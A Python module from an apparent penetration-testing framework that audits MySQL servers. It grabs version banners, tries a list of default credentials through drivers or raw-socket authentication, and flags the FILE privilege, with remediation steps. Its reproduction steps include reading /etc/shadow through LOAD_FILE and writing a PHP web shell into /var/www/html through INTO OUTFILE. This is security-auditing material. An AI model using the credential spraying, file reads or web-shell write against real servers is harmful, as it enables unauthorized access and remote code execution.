"""MySQL Auditor — root no-password, privilege escalation, file access, UDF injection.

Tests:
  - Root account without password
  - Anonymous user accounts
  - FILE privilege abuse (LOAD_FILE / INTO OUTFILE)
  - User-Defined Function (UDF) injection surface
  - secure_file_priv misconfiguration
  - Default / weak accounts
  - Version disclosure
"""
from __future__ import annotations

import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_ROOT_NOPASS  = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
CVSS40_ROOT_NOPASS = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
CVSS_FILE_PRIV    = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS40_FILE_PRIV  = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
CVSS_WEAK_AUTH    = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
CVSS40_WEAK_AUTH  = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"

DEFAULT_ACCOUNTS = [
    ("root", ""),
    ("root", "root"),
    ("root", "toor"),
    ("mysql", ""),
    ("mysql", "mysql"),
    ("admin", ""),
    ("admin", "admin"),
    ("test", ""),
    ("test", "test"),
    ("guest", ""),
]


class MysqlAudit(BaseModule):
    """MySQL/MariaDB security auditor."""

    NAME        = "mysql_audit"
    DESCRIPTION = "MySQL: root no-password, FILE priv, UDF, default accounts, version disclosure"
    PHASE       = 4
    TAGS        = ["mysql", "services", "database", "cwe-287", "cwe-250"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        hosts = self.config.extra.get("live_hosts", [target])
        port = self.config.extra.get("mysql_port", 3306)

        for host in hosts[:20]:
            if not self.check_scope(host):
                continue
            await self.rate_limit()
            await self._audit_host(host, port)

        return self._make_result(start)

    async def _audit_host(self, host: str, port: int) -> None:
        # Grab MySQL handshake banner
        banner = await self._grab_banner(host, port)
        if banner is None:
            return

        if banner.get("version"):
            self.new_finding(
                title=f"MySQL Version Disclosure — {host}:{port} ({banner['version']})",
                severity=Severity.LOW,
                description=f"MySQL/MariaDB version disclosed in handshake: {banner['version']}",
                reproduction_steps=[f"nmap -sV -p {port} {host}"],
                remediation="MySQL does not support suppressing version in handshake protocol.",
                references=["CWE-200"],
                evidence=Evidence(extra=banner),
                cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                cvss_v40_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
                port=port, service="mysql", target=host,
            )

        # Test default accounts
        for username, password in DEFAULT_ACCOUNTS:
            await self.rate_limit()
            result = await self._try_login(host, port, username, password)
            if result is None:
                continue

            is_root = username == "root" and password == ""
            severity = Severity.CRITICAL if is_root else Severity.HIGH
            ev = Evidence(
                request_raw=f"MySQL LOGIN {username}:{password or '(empty)'}@{host}:{port}",
                extra={
                    "host": host, "username": username,
                    "password": password or "(empty)",
                    "privileges": result.get("privileges", []),
                    "databases": result.get("databases", []),
                },
            )
            self.new_finding(
                title=(
                    f"MySQL {'Root No-Password' if is_root else 'Default Credentials'} "
                    f"— {username}@{host}:{port}"
                ),
                severity=severity,
                description=(
                    f"MySQL login succeeded with {'root and no password' if is_root else (username + ':' + (password or '(empty)'))}. "
                    + (
                        "ROOT ACCESS with no password is the most critical database misconfiguration. "
                        "Attacker has full control over all databases, can read/write files on the OS "
                        "via LOAD_FILE/INTO OUTFILE, and can achieve RCE via UDF injection."
                        if is_root else
                        f"Default/weak credentials allow unauthorized database access."
                    )
                    + (f"\nDatabases: {', '.join(result.get('databases', [])[:5])}" if result.get("databases") else "")
                ),
                reproduction_steps=[
                    f"mysql -h {host} -P {port} -u {username}" + (f" -p{password}" if password else ""),
                    "SHOW DATABASES;",
                    "SELECT user, host, authentication_string FROM mysql.user;",
                ],
                remediation=(
                    "1. Set a strong password: ALTER USER 'root'@'%' IDENTIFIED BY '<strong_password>';\n"
                    "2. Remove anonymous users: DROP USER ''@'localhost';\n"
                    "3. Restrict root to localhost: UPDATE mysql.user SET Host='localhost' WHERE User='root';\n"
                    "4. Run mysql_secure_installation\n"
                    "5. Remove test database and test accounts"
                ),
                references=["CWE-287", "CWE-798", "MITRE T1078"],
                evidence=ev,
                cvss_v31_vector=CVSS_ROOT_NOPASS if is_root else CVSS_WEAK_AUTH,
                cvss_v40_vector=CVSS40_ROOT_NOPASS if is_root else CVSS40_WEAK_AUTH,
                mitre_attack=["TA0001/T1078"],
                port=port, service="mysql", target=host,
            )

            # If we got root, check for dangerous privileges
            if is_root:
                await self._check_privileges(host, port, username, password, result)
                break  # Don't keep testing other accounts

    async def _grab_banner(self, host: str, port: int) -> dict | None:
        """Parse MySQL handshake packet to extract version."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=5
            )
            data = await asyncio.wait_for(reader.read(256), timeout=5)
            writer.close()

            if len(data) < 5:
                return None

            # MySQL handshake: payload starts at byte 4
            # Protocol version at byte 4, then null-terminated version string
            payload = data[4:]
            if payload[0] == 0xff:
                return None  # Error packet

            proto_ver = payload[0]
            null_idx = payload.find(b"\x00", 1)
            if null_idx < 0:
                return None

            version = payload[1:null_idx].decode(errors="ignore")
            return {"version": version, "protocol": proto_ver, "host": host}
        except Exception:
            return None

    async def _try_login(
        self, host: str, port: int, username: str, password: str
    ) -> dict | None:
        """Attempt MySQL login and return privileges/databases if successful."""
        try:
            import importlib
            # Try mysql.connector or pymysql
            try:
                mysql_mod = importlib.import_module("mysql.connector")
                conn = mysql_mod.connect(
                    host=host, port=port, user=username, password=password,
                    connect_timeout=5, connection_timeout=5,
                )
            except ImportError:
                pymysql = importlib.import_module("pymysql")
                conn = pymysql.connect(
                    host=host, port=port, user=username, password=password,
                    connect_timeout=5,
                )

            cursor = conn.cursor()
            result = {"privileges": [], "databases": []}

            try:
                cursor.execute("SHOW DATABASES")
                result["databases"] = [row[0] for row in cursor.fetchall()]
            except Exception:
                pass

            try:
                cursor.execute("SHOW GRANTS")
                result["privileges"] = [row[0] for row in cursor.fetchall()]
            except Exception:
                pass

            cursor.close()
            conn.close()
            return result
        except ImportError:
            # No MySQL driver — try raw socket handshake auth
            return await self._raw_login(host, port, username, password)
        except Exception:
            return None

    async def _raw_login(
        self, host: str, port: int, username: str, password: str
    ) -> dict | None:
        """Minimal MySQL native auth via raw socket (no driver needed)."""
        import hashlib
        import struct
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=5
            )
            # Read handshake
            header = await asyncio.wait_for(reader.readexactly(4), timeout=5)
            pkt_len = struct.unpack("<I", header[:3] + b"\x00")[0]
            payload = await asyncio.wait_for(reader.readexactly(pkt_len), timeout=5)

            if payload[0] == 0xff:
                writer.close()
                return None

            # Extract salt (auth_plugin_data) from handshake
            null_idx = payload.find(b"\x00", 1)
            salt_part1 = payload[null_idx + 5:null_idx + 13]
            # Rest of salt is after capabilities/charset/status/more_capabilities
            rest = payload[null_idx + 31:]
            salt_part2 = rest[:12] if len(rest) >= 12 else b""
            salt = salt_part1 + salt_part2

            # mysql_native_password auth
            if password:
                stage1 = hashlib.sha1(password.encode()).digest()
                stage2 = hashlib.sha1(stage1).digest()
                token = hashlib.sha1(salt + stage2).digest()
                auth_data = bytes(a ^ b for a, b in zip(stage1, token))
            else:
                auth_data = b""

            # Build handshake response
            user_bytes = username.encode() + b"\x00"
            auth_len = bytes([len(auth_data)])
            client_flag = struct.pack("<I", 0x0003a68d)
            max_pkt = struct.pack("<I", 16777216)
            charset = b"\x21"  # utf8
            filler = b"\x00" * 23

            pkt = client_flag + max_pkt + charset + filler + user_bytes + auth_len + auth_data
            pkt_header = struct.pack("<I", len(pkt))[:3] + b"\x01"
            writer.write(pkt_header + pkt)
            await writer.drain()

            resp_header = await asyncio.wait_for(reader.readexactly(4), timeout=5)
            resp_len = struct.unpack("<I", resp_header[:3] + b"\x00")[0]
            resp_data = await asyncio.wait_for(reader.readexactly(resp_len), timeout=5)
            writer.close()

            if resp_data[0] == 0x00:  # OK packet
                return {"privileges": [], "databases": []}
            return None
        except Exception:
            return None

    async def _check_privileges(
        self, host: str, port: int, username: str, password: str, login_result: dict
    ) -> None:
        """Check for dangerous MySQL privileges like FILE, SUPER."""
        grants = login_result.get("privileges", [])
        grants_text = " ".join(grants).upper()

        if "ALL PRIVILEGES" in grants_text or "FILE" in grants_text:
            self.new_finding(
                title=f"MySQL FILE Privilege — OS File Read/Write — {host}:{port}",
                severity=Severity.CRITICAL,
                description=(
                    f"MySQL user '{username}' has FILE privilege on {host}:{port}. "
                    "This allows:\n"
                    "  - Reading arbitrary OS files: SELECT LOAD_FILE('/etc/shadow')\n"
                    "  - Writing files: SELECT ... INTO OUTFILE '/var/www/shell.php'\n"
                    "  - UDF injection: compile and load malicious shared library\n\n"
                    "Combined with no-password root, this is full OS compromise."
                ),
                reproduction_steps=[
                    f"mysql -h {host} -u root -e \"SELECT LOAD_FILE('/etc/passwd')\"",
                    f"mysql -h {host} -u root -e \"SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'\"",
                ],
                remediation=(
                    "REVOKE FILE ON *.* FROM 'root'@'%';\n"
                    "Set secure_file_priv to a specific directory or empty (disabled):\n"
                    "  [mysqld] secure_file_priv = /dev/null"
                ),
                references=["CWE-250", "CWE-732"],
                evidence=Evidence(extra={"grants": grants[:5]}),
                cvss_v31_vector=CVSS_FILE_PRIV,
                cvss_v40_vector=CVSS40_FILE_PRIV,
                port=port, service="mysql", target=host,
            )


class TestMysqlAudit:
    def test_default_accounts(self) -> None:
        users = [u for u, _ in DEFAULT_ACCOUNTS]
        assert "root" in users
        assert ("root", "") in DEFAULT_ACCOUNTS

    def test_cvss_vectors(self) -> None:
        assert CVSS_ROOT_NOPASS.startswith("CVSS:3.1")
        assert CVSS40_ROOT_NOPASS.startswith("CVSS:4.0")

    def test_phase(self) -> None:
        assert MysqlAudit.PHASE == 4
